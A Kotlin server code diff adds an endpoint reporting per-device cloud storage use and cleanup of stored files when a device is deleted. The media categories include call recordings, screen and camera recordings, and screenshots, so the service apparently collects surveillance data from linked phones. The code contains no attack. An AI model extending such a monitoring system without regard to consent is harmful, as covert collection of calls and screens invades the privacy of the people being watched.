@@ -2660,6 +2660,75 @@ fun main() {
                     "totalDevices" to devRows.size, "devices" to devRows))
             }
 
+            // Cloud Storage — per-device storage breakdown for the authenticated user
+            get("/api/storage") {
+                val userId = getSessionUserId(call) ?: return@get call.respond(
+                    HttpStatusCode.Unauthorized, mapOf("error" to "Não autenticado"))
+
+                val devices = transaction {
+                    DevicesTable.select { DevicesTable.ownerId eq userId }
+                        .map { row ->
+                            mapOf(
+                                "deviceId"    to row[DevicesTable.id],
+                                "model"       to row[DevicesTable.model],
+                                "displayName" to row[DevicesTable.displayName],
+                                "isOnline"    to row[DevicesTable.isOnline]
+                            )
+                        }
+                }
+
+                val mediaTypes = listOf("photos", "audio", "screenshots", "screen-recordings", "camera-recordings", "call-recordings")
+                val result = devices.map { dev ->
+                    val deviceId = dev["deviceId"] as String
+                    val categories = mutableMapOf<String, Long>()
+                    var totalBytes = 0L
+
+                    val client = s3Client
+                    if (client != null) {
+                        try {
+                            for (t in mediaTypes) {
+                                val prefix = "uploads/$deviceId/$t/"
+                                var continuationToken: String? = null
+                                var typeBytes = 0L
+                                do {
+                                    val reqBuilder = ListObjectsV2Request.builder()
+                                        .bucket(r2BucketName)
+                                        .prefix(prefix)
+                                    if (continuationToken != null) reqBuilder.continuationToken(continuationToken)
+                                    val resp = client.listObjectsV2(reqBuilder.build())
+                                    resp.contents().forEach { typeBytes += it.size() }
+                                    continuationToken = if (resp.isTruncated == true) resp.nextContinuationToken() else null
+                                } while (continuationToken != null)
+                                categories[t] = typeBytes
+                                totalBytes += typeBytes
+                            }
+                        } catch (e: Exception) {
+                            println("R2 STORAGE: Failed to calculate storage for $deviceId: ${e.message}")
+                        }
+                    } else {
+                        for (t in mediaTypes) {
+                            val dir = java.io.File("uploads/$deviceId/$t")
+                            val typeBytes = if (dir.exists() && dir.isDirectory)
+                                dir.walkTopDown().filter { it.isFile }.sumOf { it.length() }
+                            else 0L
+                            categories[t] = typeBytes
+                            totalBytes += typeBytes
+                        }
+                    }
+
+                    mapOf(
+                        "deviceId"    to deviceId,
+                        "model"       to (dev["model"] as String),
+                        "displayName" to (dev["displayName"] as String),
+                        "isOnline"    to (dev["isOnline"] as Boolean),
+                        "totalBytes"  to totalBytes,
+                        "categories"  to categories
+                    )
+                }
+
+                call.respond(mapOf("devices" to result))
+            }
+
             // Delete a device (owner only)
             delete("/api/devices/{id}") {
                 val userId = getSessionUserId(call) ?: return@delete call.respond(
@@ -2685,6 +2754,32 @@ fun main() {
                 deviceSessions.remove(deviceId)
                 deviceOwnerCache.remove(deviceId)
                 transaction { DevicesTable.deleteWhere { DevicesTable.id eq deviceId } }
+
+                // Clean up R2 / local storage files for the deleted device
+                val allMediaTypes = listOf("photos", "audio", "screenshots", "screen-recordings", "camera-recordings", "call-recordings")
+                val s3 = s3Client
+                if (s3 != null) {
+                    try {
+                        for (t in allMediaTypes) {
+                            val prefix = "uploads/$deviceId/$t/"
+                            val listReq = ListObjectsV2Request.builder().bucket(r2BucketName).prefix(prefix).build()
+                            val objects = s3.listObjectsV2(listReq).contents()
+                            if (objects.isNotEmpty()) {
+                                val identifiers = objects.map { ObjectIdentifier.builder().key(it.key()).build() }
+                                val delReq = DeleteObjectsRequest.builder()
+                                    .bucket(r2BucketName)
+                                    .delete(software.amazon.awssdk.services.s3.model.Delete.builder().objects(identifiers).build())
+                                    .build()
+                                s3.deleteObjects(delReq)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        println("R2: Failed to clean up storage for deleted device $deviceId: ${e.message}")
+                    }
+                } else {
+                    val uploadDir = java.io.File("uploads/$deviceId")
+                    if (uploadDir.exists()) uploadDir.deleteRecursively()
+                }
 
                 // O linkToken do usuário permanece o mesmo — o código do painel é
                 // um identificador estável da conta, não do aparelho. O dispositivo
